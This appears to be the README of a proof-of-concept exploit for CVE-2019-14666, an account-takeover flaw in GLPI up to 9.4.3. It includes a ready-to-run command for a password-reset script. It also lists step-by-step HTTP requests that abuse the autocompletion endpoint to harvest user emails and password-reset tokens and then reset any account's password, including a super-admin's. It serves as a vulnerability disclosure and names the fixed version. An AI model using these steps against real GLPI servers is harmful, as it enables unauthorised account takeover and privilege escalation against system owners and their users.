# GLPI-9.4.3-Account-Takeover
Discovery and original PoC made by Pablo Martinez just adjusted slightly for python3

####Example
python3 reset.py --url http://localhost/ --user normal --password normal --email glpi_adm --newpass test


Sofware: GLPI 
Version: <= 9.4.3 
Discovered by: Pablo Martinez (@Xassiz)
Fix: version 9.4.4
Vulnerability: Account takeover (CVE-2019-14666)
Description:
We've found that it's possible to abuse autocompletion feature to retrieve sensitive data from any user, using an unprivileged account.
Besides hashed session cookies or api keys in cleartext, a malicious user can retrieve the password_forget_token atributte which leads to account takeover when "Lost password" feature is enabled.
The steps are the following:
    1. Choose a known email or get a list of them using autocompletion
        GET /glpi/ajax/autocompletion.php?itemtype=UserEmail&field=email&term=
     
    2. Get a list of all generated tokens
        GET /glpi/ajax/autocompletion.php?itemtype=User&field=password_forget_token&term=
 
    3. Invoke "Lost password" with target email
    4. Get a list of all generated tokens again and compute the difference to get your freshly generated token
 
    5. Set new password using /glpi/front/lostpassword.php?password_forget_token=[token]
    
To sum up: an unprivileged user could steal any account or escalate privileges by changing super-admin password. It's also possible to steal admins' api keys and use them with malicious purposes.
